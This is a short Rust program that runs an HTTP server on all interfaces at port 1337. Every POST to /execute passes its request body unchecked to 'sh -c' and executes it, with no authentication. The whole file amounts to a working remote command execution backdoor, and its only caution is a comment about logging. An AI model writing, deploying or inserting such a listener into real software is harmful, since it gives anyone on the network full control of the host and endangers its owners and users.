use std::io::Read;
use std::process::Command;
use tiny_http::{Server, Response};

fn main() {
    let server = Server::http("0.0.0.0:1337").unwrap();
    println!("Server listening on port 1337");

    for mut request in server.incoming_requests() {
        let url = request.url().to_string();

        if url == "/execute" && request.method().as_str() == "POST" {
            let mut command_str = String::new();
            request.as_reader().read_to_string(&mut command_str).unwrap();

            // Logging the command for debugging purposes (remove in production for security)
            println!("Executing command: {}", command_str);

            // Execute received command
            let output = Command::new("sh")
                .arg("-c")
                .arg(&command_str)
                .output()
                .expect("Failed to execute command");

            let response_string = if output.status.success() {
                "Command executed successfully"
            } else {
                "Command execution failed"
            };

            let response = Response::from_string(response_string);
            request.respond(response).unwrap();
        } else {
            let response = Response::from_string("Invalid request");
            request.respond(response).unwrap();
        }
    }
}
